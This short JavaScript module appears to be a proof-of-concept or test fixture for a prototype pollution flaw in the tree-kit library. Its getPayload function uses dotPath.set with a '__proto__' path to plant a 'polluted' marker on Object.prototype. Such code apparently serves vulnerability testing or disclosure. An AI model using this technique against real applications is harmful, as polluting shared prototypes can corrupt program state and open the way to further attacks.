function getPayload() {
    const { dotPath } = require('tree-kit');
    const obj = {};
    dotPath.set(obj, ["__proto__", "polluted"], "yes");
    return obj;
}

module.exports = { getPayload };